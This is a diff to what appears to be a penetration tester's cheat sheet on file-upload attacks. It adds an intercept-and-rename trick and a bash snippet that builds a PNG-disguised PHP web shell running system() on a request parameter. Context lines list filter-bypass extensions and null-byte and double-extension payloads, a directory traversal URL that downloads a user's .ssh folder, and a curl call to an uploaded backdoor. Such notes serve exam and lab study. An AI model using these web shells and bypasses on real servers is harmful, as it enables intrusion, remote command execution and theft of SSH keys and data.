@@ -200,6 +200,8 @@ For PDF bypass, try to add the "%PHP-1.7\n%" thing at the top and change the nam
 http://192.168.180.231/?cwd=../../../../../../../../home/remi&file=.ssh&download=true
 ```
 
+You can upload as cmd.jpg then intercept and switch to cmd.jpg.php.
+
 - Wherever you can upload files, see what files you are allowed to upload. If .php files are blacklisted, then you can try to use .pHP, .phps, .php7, pht, phpt, phtml, php3, php4, php5, php6 instead. If .sh files are blacklisted, then you can try to use .zsh instead.
 
 - Whitelisting may be able to be bypassed through methods such as adding a null byte injection, "payload.php\x00.png", "shell.php%00.txt", "echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime.php.png", or by using double extensions for the file, "shell.txt.php"
@@ -238,6 +240,10 @@ kali@kali:~$ curl http://example.com/subdir/uploads/simple-backdoor.pHP?cmd=powe
 
 - See if you can overwrite files, such as authorized_keys. Worst case, you may get information about the web stack
 
+```bash
+echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
+echo '<?php system($_REQUEST['cmd']); ?>' >> mime_shell.php.png
+```
 19. File Upload Vulns (Non-Executable)
 
 - When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
